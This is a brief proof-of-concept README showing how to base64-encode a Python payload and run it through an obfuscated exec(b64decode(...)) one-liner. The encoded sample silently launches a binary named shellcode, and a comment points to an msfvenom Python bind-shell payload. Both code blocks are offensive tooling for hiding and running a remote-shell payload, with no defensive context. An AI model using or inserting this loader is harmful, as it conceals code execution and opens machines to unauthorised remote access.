# POC

## Generate base64 encoded payload

```bash
$: cat shellcode.py | base64
aW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IG9zCgp3aXRoIG9wZW4ob3MuZGV2bnVsbCwgInciKSBh
cyBmOgogICAgc3VicHJvY2Vzcy5Qb3BlbihbIi91c3IvYmluL3NoZWxsY29kZSJdLCBzdGRvdXQ9
Ziwgc3RkZXJyPWYp
```

## Execute base64 inside a python script

```python
# From msfvenom -p python/shell_bind_tcp > shell.py
exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')(<base64>)[0]))
```
